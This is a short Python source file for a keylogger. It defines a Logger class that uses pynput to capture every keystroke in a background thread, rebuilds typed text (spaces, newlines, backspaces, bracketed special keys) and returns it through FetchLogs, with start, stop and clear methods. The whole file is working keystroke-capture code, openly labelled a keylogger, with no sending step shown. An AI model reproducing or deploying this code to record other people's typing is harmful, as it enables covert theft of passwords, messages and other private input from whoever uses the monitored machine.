
# Import modules
from pynput.keyboard import Listener, Key # pip install pynput
from threading import Thread

class Logger:

    # Constructor
    def __init__(self):
        self.__keys = ''
        self.__stopped = None
        self.__thread = self.__NewThread()

    # Log key press
    def __LogKeyPress(self, key: str):
        key_text = str(key)
        for old, new in {
            'Key.space': ' ',
            'Key.enter': '\n',
            '\'': '',
            'Key.': ''
        }.items(): key_text = key_text.replace(old, new)
        if key == Key.backspace and len(self.__keys) > 0:
            self.__keys = self.__keys[:-1]
        if len(key_text) > 1:
            key_text = f"[{key_text}]".upper()
        self.__keys += key_text
        if self.__stopped:
            return False
    
    # Run logger
    def __Run(self):
        with Listener(on_press=self.__LogKeyPress) as listener:
            listener.start()
            listener.join()

    # Return new thread
    def __NewThread(self):
        return Thread(target=self.__Run)

    # Return all logs
    def FetchLogs(self) -> str:
        return self.__keys

    # Clean logs
    def CleanLogs(self):
        self.__keys = ''
        
    # Start keylogger
    def Start(self):
        self.__stopped = False
        self.__thread.start()

    # Stop keylogger
    def Stop(self):
        self.__stopped = True
        self.__thread.join()
